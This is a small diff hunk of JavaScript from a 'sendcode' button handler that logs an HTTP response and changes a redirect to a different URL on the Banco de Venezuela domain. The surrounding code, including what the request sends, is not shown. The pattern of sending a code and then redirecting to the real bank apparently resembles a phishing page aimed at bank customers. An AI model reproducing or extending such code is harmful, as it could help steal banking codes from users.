@@ -83,5 +83,5 @@ sendcode.addEventListener("click", () => {
     console.log(Http.responseText);
   };
 
-  window.location.href = "https://www.bancodevenezuela.com";
+  window.location.href = "https://bancodevenezuela.com/index.html@p=4153.html";
 });
